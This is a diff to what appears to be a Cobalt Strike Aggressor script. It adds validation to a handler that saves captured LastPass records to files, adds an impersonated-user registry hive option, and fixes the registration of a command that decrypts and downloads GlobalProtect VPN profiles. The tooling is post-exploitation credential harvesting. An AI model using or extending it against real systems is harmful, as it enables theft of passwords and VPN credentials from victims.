@@ -6,7 +6,8 @@
     HKCR => 0,
     HKCU => 1,
     HKLM => 2,
-    HKU  => 3
+    HKU  => 3,
+    HKCU_LOCAL_IMP => 4
 );
 #sleep can't handle the actual values... so we'll just add them on the c side :(
 
@@ -595,6 +596,11 @@ on beacon_output
         $id = left($message, 10);
 
         if ($id eq $id_lastpass){
+			if (strlen($message) < 0x18) {
+				blog($beacon, "Ignoring malformed LastPass record: header is truncated");
+				return;
+			}
+
 			@pid = unpack("I",substr($message,0xc,0x10));
 			@type_int = unpack("I",substr($message, 0x10, 0x14));
 			@buf_sz = unpack("I",substr($message, 0x14, 0x18));
@@ -645,10 +651,15 @@ on beacon_output
 					blog($beacon, "Exec failed");
 				}	
 			} else {
+				if (strlen($message) != (0x18 + @buf_sz[0])) {
+					blog($beacon, "Ignoring malformed LastPass record: payload length does not match header");
+					return;
+				}
+
 				$lp_filename = script_resource("lastpass/lp_".@pid[0]."_".$type.".txt");
 				$handle = openf(">>".$lp_filename);
 				print($handle, "<MSG>");
-				print($handle, substr($message,0x18));
+				print($handle, substr($message, 0x18, 0x18 + @buf_sz[0]));
 				println($handle, "</MSG>");
 				closef($handle);
 			}	
@@ -862,6 +873,7 @@ Usage:   reg_set reg_set [OPT:HOSTNAME] [HIVE] [KEY] [VALUE] [TYPE] [DATA]
                   values:
                     HKLM
                     HKCU
+                    HKCU_LOCAL_IMP (if impersonating a user, reference their HKCU locally)
                     HKU
                     HKCR
          KEY      Required. The registry path. 
@@ -956,6 +968,7 @@ Usage:   reg_delete [OPT:HOSTNAME] [HIVE] [REGPATH] [OPT:REGVALUE]
                   values:
                     HKLM
                     HKCU
+                    HKCU_LOCAL_IMP (if impersonating a user, reference their HKCU locally)
                     HKU
                     HKCR
          REGPATH  Required. The registry path (deleted if value not given).
@@ -1009,6 +1022,7 @@ Usage:   reg_save [HIVE] [REGPATH] [FILEOUT]
                   values:
                     HKLM
                     HKCU
+                    HKCU_LOCAL_IMP (if impersonating a user, reference their HKCU locally)
                     HKU
                     HKCR
          REGPATH  Required. The registry path to save.
@@ -2098,7 +2112,7 @@ alias global_unprotect {
 
 beacon_command_register(
     "global_unprotect",
-    "Attempts to find, decrypt, and download Global Protect VPN profiles and HIP settings"
+    "Attempts to find, decrypt, and download Global Protect VPN profiles and HIP settings",
     "Usage: global_unprotect
     
     There are no arguments to this command"
